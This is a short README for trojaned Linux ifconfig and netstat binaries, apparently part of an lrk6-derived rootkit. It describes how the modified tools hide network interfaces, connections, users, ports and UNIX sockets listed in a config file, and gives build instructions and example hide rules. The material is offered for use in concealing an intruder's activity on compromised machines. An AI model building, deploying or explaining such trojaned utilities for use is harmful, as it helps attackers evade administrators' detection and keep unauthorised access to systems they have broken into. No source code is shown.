ifconfig trojano  by twiz - twiz@superdotati.net

This ifconfig hides interfaces written in a extern file (defined in a char 
array tifconfilez[] to "strings" hiding).
For example put "sit0" if you want to hide sit0 ecc ecc :)
To compile enter in "lib" directory and give "make", than come back in "ifconfig.c directory" and give make again...(this 'cause a lame error in Makefile).
And then enjoy yourself :)

netstat trojano - originally by vejeta, little modified by me :)

From lrk6 :
netstat -       Modified to remove tcp/udp/sockets from or to specified
                addresses, uids and ports. 
                type 0: hide uid
                type 1: hide local address
                type 2: hide remote address
                type 3: hide local port
                type 4: hide remote port
                type 5: hide UNIX socket path

                example:
                0 500           <- Hides all connections by uid 500
                1 128.31        <- Hides all local connections from 128.31.X.X
                2 128.31.39.20  <- Hides all remote connections to 128.31.39.20
                3 8000          <- Hides all local connections from port 8000
                4 6667          <- Hides all remote connections to port 6667
                5 .term/socket  <- Hides all UNIX sockets including the path
                                   .term/socket


-> the config file is still in a char array in source code, change it if you 
   want...
